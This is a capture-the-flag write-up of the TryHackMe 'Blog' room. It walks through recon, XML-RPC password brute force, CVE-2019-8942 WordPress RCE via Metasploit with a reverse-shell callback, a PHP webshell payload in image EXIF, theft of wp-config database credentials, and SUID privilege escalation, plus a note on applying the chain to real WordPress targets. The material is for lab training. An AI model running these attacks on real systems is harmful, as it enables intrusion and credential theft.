# Blog — Writeup

> **Platform:** TryHackMe
> **Difficulty:** Medium
> **Date Completed:** 2026-02-20
> **Session File:** `sessions/2026-02-20-blog/session.md`

## TL;DR

A WordPress 5.0 blog with two users. We brute-forced credentials via XML-RPC, exploited a known path traversal + LFI vulnerability (CVE-2019-8942) to get RCE as `www-data`, then escalated to root via a custom SUID binary that blindly trusts an environment variable. Classic CMS exploitation → custom binary privesc chain.

---

## What We're Practicing

| Skill | Tier | What We Practiced |
|---|---|---|
| RCE (Remote Code Execution) | Tier 2 | WordPress crop-image path traversal → PHP execution |
| Authentication Attacks | Tier 1 | XML-RPC brute force — bypasses login rate limiting |
| Access Control Flaws | Tier 1 | SUID binary with no input validation |

---

## The Attack — Step by Step

### Phase 1: Reconnaissance

*What's running on the target? Scan all ports, identify services and versions.*

**What we did:**
```bash
# Quick scan — top 1000 ports with version detection and default scripts
nmap -sC -sV -oN sessions/blog/nmap-initial.txt 10.67.177.160

# Full port scan — all 65535 ports (run in background while reviewing initial results)
nmap -p- -T4 -oN sessions/blog/nmap-full.txt 10.67.177.160
```

**`-sC`** runs nmap's default script collection — things like checking for anonymous FTP, grabbing HTTP titles, testing SMB shares. **`-sV`** probes each open port to identify the exact service and version. These two flags together are your bread and butter for initial recon.

**What we found:**

| Port | Service | Version | Interesting? |
|---|---|---|---|
| 22 | SSH | OpenSSH 7.6p1 Ubuntu | Low priority — usually not directly exploitable |
| 80 | HTTP | Apache 2.4.29 + WordPress 5.0 | **Primary target** — WordPress 5.0 is outdated and has known RCE |
| 139 | SMB | Samba 3.X-4.X | Worth checking for anonymous access |
| 445 | SMB | Samba 4.7.6-Ubuntu | Same as above |

The full port scan confirmed no additional ports were hiding. Four services, clean picture.

**Decision point:** WordPress 5.0 is the obvious target. Version 5.0 specifically has CVE-2019-8942 (crop-image RCE), which only needs Author-level credentials — not admin. But we need creds first. SMB is worth a quick check for intel, but HTTP/WordPress is the main attack path.

---

### Phase 2: Enumeration

#### SMB Shares (Quick Check)

```bash
# List shares anonymously
smbclient -L //10.67.177.160 -N

# Connect to accessible share
smbclient //10.67.177.160/BillySMB -N

# Also ran full enumeration
enum4linux -a 10.67.177.160
```

**`-N`** means null session (no password). **`-L`** lists available shares.

**What we found:**
- `BillySMB` share accessible anonymously
- Contents: `Alice-White-Rabbit.jpg`, `tswift.mp4`, `check-this.png`
- **All rabbit holes.** No useful data in any of these files.
- `enum4linux` RID cycling revealed system users: `bjoel` (UID 1000), `smb` (UID 1001)

**Lesson:** SMB shares can be bait. Check them, but don't spend time on steganography or media files unless there's a clear reason to. The usernames from RID cycling were more valuable than the share contents.

#### WordPress Enumeration

```bash
# WPScan — enumerate users, plugins, themes, and vulnerabilities
wpscan --url http://10.67.177.160 --enumerate u,p,t
```

**What we found:**
- WordPress version: 5.0 (confirmed — vulnerable to CVE-2019-8942)
- Theme: Twenty Twenty 1.3
- Users: `kwheel` (Karen Wheeler), `bjoel` (Billy Joel)
- XML-RPC enabled (this is key — allows brute force without hitting the login page)
- Upload directory listing enabled
- No vulnerable plugins

#### Brute Force via XML-RPC

```bash
# WPScan password attack using XML-RPC (faster than wp-login, bypasses some rate limiting)
wpscan --url http://10.67.177.160 --usernames kwheel,bjoel --passwords /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

**Why XML-RPC instead of the login page?** WordPress's XML-RPC interface (`/xmlrpc.php`) accepts `system.multicall`, which lets you try multiple passwords in a single HTTP request. This is significantly faster than hitting `/wp-login.php` one attempt at a time, and many security plugins that block login brute force don't protect XML-RPC.

**Result:** `kwheel:cutiepie1` — Author-level account. That's all we need for the crop-image exploit.

**Decision point:** We have Author-level credentials on WordPress 5.0. CVE-2019-8942 requires exactly this — Author-level access. Time to exploit.

---

### Phase 3: Exploitation — Initial Access

**The vulnerability:**
- **CVE:** CVE-2019-8942 / CVE-2019-8943
- **Type:** Path traversal + Local File Inclusion → Remote Code Execution
- **CVSS:** 8.8 (High)
- **Affected software:** WordPress 5.0.0 and WordPress ≤ 4.9.8
- **Required access:** Author-level (can upload media)

**Why it works:**

This is a two-stage exploit that abuses WordPress's image cropping feature:

1. **Upload stage:** An Author-level user uploads a JPEG image. But this isn't a normal JPEG — it has PHP code embedded in its EXIF/IPTC metadata (the data cameras store about photos). The PHP payload looks like `<?= \`$_GET[0]\` ;?>`, which executes any command passed as a URL parameter.

2. **Path traversal stage:** WordPress stores a reference to the uploaded file in the database (`_wp_attached_file` post meta). The exploit modifies this reference to include directory traversal characters: `2019/02/image.jpg?/../../../../themes/theme_name/shell`. When WordPress's `crop-image` AJAX action processes this, it creates a copy of the image at the traversed path — effectively writing the PHP-laden JPEG into the theme directory.

3. **Execution stage:** The exploit creates a new WordPress post with `_wp_page_template` set to the filename of the cropped image. WordPress includes page templates as PHP files. When someone visits this post, WordPress `include()`s the JPEG, PHP finds the code in the EXIF data, and executes it.

**The developer mistake:** WordPress didn't sanitize the `_wp_attached_file` value for path traversal characters before using it to construct file paths in the crop-image handler. The `?` in the path is a URL query string trick that makes PHP's `file_exists()` check pass while allowing `../` traversal in the actual file copy operation.

**The attack:**
```bash
# We used Metasploit's module for this one. Here's what it does under the hood:
msfconsole

use exploit/multi/http/wp_crop_rce
set RHOSTS 10.67.177.160
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST <YOUR_ATTACKER_IP>
set LPORT 4444
exploit
```

**What Metasploit does behind the scenes:**
1. Logs into WordPress as `kwheel`
2. Uploads a crafted JPEG with PHP shell code in EXIF metadata
3. Modifies the `_wp_attached_file` post meta to include path traversal
4. Triggers the `crop-image` AJAX action — WordPress copies the image into the active theme directory
5. Creates a post that uses the malicious image as a page template
6. Sends a request to the post URL, triggering PHP execution
7. The PHP payload calls back to your listener

**Result:** Meterpreter session as `www-data` on the target.

```bash
# Drop from Meterpreter to a standard shell (more reliable for Linux enum)
shell

# Stabilize the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

---

### Phase 4: Post-Exploitation & Privilege Escalation

**Situation:** We're `www-data` — the Apache web server user. Low privileges, but we can read web application files and run system commands.

**Enumeration:**
```bash
# Who are we?
whoami          # www-data
id              # uid=33(www-data) gid=33(www-data)

# Can we sudo anything?
sudo -l         # No — www-data has no sudo entries

# Check for user flag
cat /home/bjoel/user.txt
# "You won't find what you're looking for here. TRY HARDER"
# Troll flag. Real one is elsewhere.

# Grab database credentials from WordPress config
cat /var/www/wordpress/wp-config.php
# Found: wordpressuser:LittleYellowLamp90!@ (database: blog)

# Search for SUID binaries — these run with their owner's permissions regardless of who executes them
find / -perm -4000 -type f 2>/dev/null
```

**The SUID binary:** `/usr/sbin/checker` — this is NOT a standard Linux binary. Any custom SUID binary is worth investigating.

```bash
# What does this binary do? Use ltrace to trace library calls
ltrace /usr/sbin/checker
```

**Output:**
```
getenv("admin") = nil
puts("Not an Admin")
```

**What ltrace told us:** The binary calls `getenv("admin")` — it checks if an environment variable called `admin` exists. If it doesn't exist (returns nil), it prints "Not an Admin" and exits. It doesn't check the VALUE of the variable, just whether it EXISTS.

**The privesc vector:**
- **Type:** SUID binary with insecure environment variable check
- **Why it works:** The developer set the SUID bit on a binary that makes security decisions based on an environment variable. Environment variables are fully controlled by the user. Any user can `export admin=anything` before running the binary. The binary then sees `admin` is set, assumes the caller is an admin, and drops to a root shell. This is a textbook example of trusting user-controlled input for security decisions.

**The escalation:**
```bash
# Set the environment variable (value doesn't matter — it just needs to exist)
export admin=1

# Run the SUID binary — it checks for "admin" env var, finds it, gives us root
/usr/sbin/checker

# Verify
whoami    # root
```

**Result:** Root shell.

**Finding the flags:**
```bash
# Root flag — standard location
cat /root/root.txt
# 9a0b2b618bef9bfa7ac28c1353d9f318

# User flag — NOT in /home/bjoel (that was a troll)
find / -name "user.txt" -readable 2>/dev/null
cat /media/usb/user.txt
# c8421899aae571f7af486492b71a8ab7
```

---

## Flags

| Flag | Value | Location |
|---|---|---|
| User | `c8421899aae571f7af486492b71a8ab7` | `/media/usb/user.txt` (only readable as root) |
| Root | `9a0b2b618bef9bfa7ac28c1353d9f318` | `/root/root.txt` |

---

## Tools Used

| Tool | Purpose | Why This Tool |
|---|---|---|
| **nmap** | Port scanning + service version detection | Industry standard. `-sC -sV` combo gives you services, versions, and quick vulnerability hints in one scan. |
| **smbclient** | SMB share enumeration | Lightweight, comes with Kali. Good for quick anonymous share checks. |
| **enum4linux** | SMB/NetBIOS full enumeration | More thorough than smbclient alone — does RID cycling to find usernames, which was valuable here. |
| **wpscan** | WordPress-specific vulnerability scanner | Purpose-built for WordPress. User enumeration, plugin/theme detection, xmlrpc brute force — faster and more thorough than generic web scanners. |
| **Metasploit** | Exploit framework (wp_crop_rce module) | Complex multi-step exploit that would be painful to run manually. Metasploit handles the EXIF embedding, path traversal, post creation, and callback automatically. |
| **ltrace** | Library call tracer | Shows you what system/library functions a binary calls. Essential for understanding unknown SUID binaries without reverse engineering. |

---

## Bug Bounty Relevance

- **Would this work on a real target?** The WordPress RCE — yes, if you find a WordPress 5.0 instance (rare now, but legacy installations exist). The XML-RPC brute force technique is broadly applicable — many WordPress sites still have XML-RPC enabled. The SUID privesc is CTF-specific, but the methodology of checking for custom binaries and tracing them applies to any Linux server you land on.

- **Where would you find this in the wild?** WordPress is ~40% of the web. XML-RPC brute force bypassing login protection is a real finding on bug bounty programs. Outdated WordPress versions with known RCE are less common on major programs but exist on smaller/legacy targets. The real-world translation is: always check CMS version, always check XML-RPC, always check for Author-level exploits (not just admin).

- **What's the bounty potential?**
  - XML-RPC brute force enabling → Low-Medium ($100-500) — it's a misconfiguration that enables credential attacks
  - WordPress RCE → Critical ($5,000-20,000+) — full server compromise
  - The combination (brute force → RCE) is a valid attack chain for a report

- **Recon pattern to remember:** On any WordPress target: `wpscan --enumerate u,p,t` → check version against CVE databases → test XML-RPC with `wpscan --password-attack xmlrpc`

---

## Lessons Learned

### What worked
- Systematic enumeration — check every service, don't tunnel vision on HTTP
- XML-RPC brute force was significantly faster than login page attacks
- `ltrace` on unknown SUID binaries — instant understanding without reverse engineering
- Setting `export admin=1` was trivial once we understood what the binary checked

### What didn't work / rabbit holes
- SMB shares (BillySMB) — spent time checking files that were all bait. Lesson: if share contents are random media files with no clear connection to the target, move on quickly.
- `/home/bjoel/user.txt` — troll flag. Lesson: user flags aren't always in the obvious location. Search the whole filesystem.

### Key takeaways
1. **WordPress 5.0 crop-image RCE needs Author, not Admin.** This is important — many people assume WordPress exploits need admin creds. Author-level is much easier to obtain.
2. **Custom SUID binaries are always interesting.** Standard system SUIDs (sudo, passwd, ping) are rarely exploitable. Custom ones (`/usr/sbin/checker`) are written by humans who make mistakes.
3. **`ltrace` is your best friend for SUID analysis.** Faster than `strings`, more informative than `file`, doesn't require IDA/Ghidra.
4. **Environment variables are user-controlled input.** Any security decision based on them without additional validation is a vulnerability.

### Skills to practice next
- Manual WordPress exploitation (understand what Metasploit does, be able to replicate with curl/python)
- More SUID binary analysis — try rooms with harder custom binaries
- Expand beyond `ltrace` — learn `strace`, basic `gdb`, `strings` analysis

---

## References

- [CVE-2019-8942 — WordPress Crop-Image RCE](https://nvd.nist.gov/vuln/detail/CVE-2019-8942)
- [WPScan Documentation](https://github.com/wpscanteam/wpscan)
- [GTFOBins — SUID Exploits](https://gtfobins.github.io/)
- Knowledge file: `knowledge/cve-database.md` (CVE-2019-8942 entry)
- Knowledge file: `knowledge/privesc-linux.md` (SUID section)
- Tool playbook: `directives/tool-playbooks.md` (WPScan, Nmap, Metasploit sections)
